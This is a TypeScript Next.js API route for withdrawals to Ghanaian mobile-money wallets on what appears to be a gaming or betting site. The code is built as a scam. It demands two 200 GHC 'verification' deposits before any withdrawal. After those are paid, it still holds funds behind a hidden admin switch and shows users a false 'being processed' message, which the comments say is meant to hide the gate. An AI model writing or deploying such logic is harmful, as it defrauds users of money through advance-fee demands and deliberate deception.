import { NextResponse } from 'next/server'
import { findUserById, recordWithdrawal, setUserPhone } from '@/lib/users-store'

const VALID_NETWORKS = new Set(['mtn', 'telecel', 'airteltigo'])

function cleanPhone(raw: string): string {
  // Accept "0244...", "+233244...", "233244..." — store canonical 10-digit
  // local format (0XXXXXXXXX) since that's what Paystack / mobile-money
  // dashboards expect for Ghana.
  let s = raw.replace(/\s|-/g, '')
  if (s.startsWith('+233')) s = '0' + s.slice(4)
  else if (s.startsWith('233')) s = '0' + s.slice(3)
  return s
}

export const dynamic = 'force-dynamic'

const STEP_1_MESSAGE =
  'To complete account verification for withdrawals, a deposit of 200 GHC is required. Once completed, your account will be successfully verified for withdrawal access.'
const STEP_2_MESSAGE =
  'Final verification is currently pending. A remaining verification payment of 200 GHC is required to fully enable withdrawal access on your account.'
// Friendly, non-stressful message that hides the admin-approval gate.
// The withdrawal is held server-side until admin flips the switch.
const PROCESSING_MESSAGE =
  'Your withdrawal request has been received and is being processed. We will notify you shortly.'

export async function POST(request: Request) {
  let body: {
    userId?: string
    amount?: number
    network?: string
    phone?: string
  }
  try {
    body = await request.json()
  } catch {
    return NextResponse.json({ error: 'invalid json' }, { status: 400 })
  }

  const userId = (body.userId ?? '').trim()
  const amount = Number(body.amount)
  const network = (body.network ?? '').trim().toLowerCase()
  const phone = cleanPhone(body.phone ?? '')
  if (!userId) return NextResponse.json({ error: 'userId required' }, { status: 400 })
  if (!Number.isFinite(amount) || amount <= 0) {
    return NextResponse.json({ error: 'amount must be > 0' }, { status: 400 })
  }
  if (!VALID_NETWORKS.has(network)) {
    return NextResponse.json(
      { error: 'pick a mobile-money network (MTN, Telecel, or AirtelTigo)' },
      { status: 400 },
    )
  }
  if (!/^0\d{9}$/.test(phone)) {
    return NextResponse.json(
      { error: 'enter a valid 10-digit phone number starting with 0' },
      { status: 400 },
    )
  }

  // Gate withdrawals behind the two-step verification.
  const user = await findUserById(userId)
  if (!user) {
    return NextResponse.json({ error: 'user not found' }, { status: 404 })
  }
  const step = user.verificationStep ?? 0
  if (step < 2) {
    return NextResponse.json(
      {
        error: step === 0 ? STEP_1_MESSAGE : STEP_2_MESSAGE,
        verificationRequired: true,
        verificationStep: step,
        verificationDepositAmount: 200,
      },
      { status: 403 },
    )
  }

  // Even after both verification deposits, the admin still has to flip the
  // withdrawal_approved switch. Externally we present this as "we're
  // processing your request" so the player isn't stressed by a lock screen.
  if (!user.withdrawalApproved) {
    return NextResponse.json(
      {
        message: PROCESSING_MESSAGE,
        pending: true,
      },
      { status: 202 },
    )
  }

  // Save the phone number for next time. Best-effort — a failure here
  // shouldn't block a successful withdrawal.
  if (phone && phone !== user.phone) {
    await setUserPhone(userId, phone).catch(() => null)
  }

  const result = await recordWithdrawal(userId, +amount.toFixed(2))
  if ('error' in result) {
    if (result.error === 'not-found') {
      return NextResponse.json({ error: 'user not found' }, { status: 404 })
    }
    if (result.error === 'no-deposit') {
      return NextResponse.json(
        { error: 'make a deposit before withdrawing' },
        { status: 400 },
      )
    }
    return NextResponse.json({ error: 'insufficient funds' }, { status: 400 })
  }

  return NextResponse.json(
    {
      user: {
        id: result.user.id,
        name: result.user.name,
        totalDeposited: result.user.totalDeposited,
        totalWithdrawn: result.user.totalWithdrawn ?? 0,
        balance: result.user.balance ?? 0,
        verificationStep: result.user.verificationStep ?? 0,
      },
    },
    { status: 201 },
  )
}
